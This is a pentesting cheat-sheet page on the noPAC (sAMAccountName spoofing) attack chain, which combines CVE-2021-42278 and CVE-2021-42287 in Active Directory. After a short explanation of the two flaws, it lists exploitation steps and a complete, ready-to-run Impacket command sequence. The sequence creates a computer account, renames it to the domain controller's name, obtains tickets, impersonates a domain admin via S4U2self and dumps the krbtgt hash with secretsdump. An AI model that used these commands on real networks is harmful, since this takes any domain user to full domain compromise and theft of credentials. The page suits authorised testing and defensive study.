title: "sAMAccountName Spoofing/noPAC"

## Introduction

By combining CVE-2021-42278 and CVE-2021-42287 it is possible, under default conditions, for a regular user to easily impersonate a domain admin. This means that any domain user can effectively become a domain administrator, which makes these vulnerabilities extremely severe.

- CVE-2021-42278 - Invalid Computer Account Name
Computer account names in Active Directory end with "$", but is not correctly enforced. The computer account name attribute is "sAMAccountName" and it is possible to see and edit the this attribute manually.

- CVE-2021-42287 - Kerberos Key Distribution Center Confusion
When a request for a service ticket is sent and it is not found, the KDC will automatically lookup the requested ticket appended with "$".

## Exploitation Steps

To exploit this issue, an attacker needs the ability to control a computer account. As mentioned, the attacker needs to be able to modify both the "servicePrincipalName" attribute and "sAMAccountName" attribute. The simplest way to achieve this is to create one by the MachineAccountQuota attribute which is the default configuration for any unprivileged user to create up to 10 computer accounts.

1. Enumerate a domain controller.
2. Create a new computer account without any SPN.
3. Leverage CVE-2021-42278 to modify the "sAMAccountName" to the domain controller account name.
4. Get a TGT of the controlled computer account.
5. Restore the computer account name so it will not be found when the KDC looks for it.
6. Leverage CVE-2021-42287 using the obtained TGT to request a service ticket with S4U2Self.

There are many tools we can use.

[GetST.py](https://github.com/SecureAuthCorp/impacket/pull/1202) and [renameMachine.py](https://github.com/SecureAuthCorp/impacket/pull/1224)


```
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
```
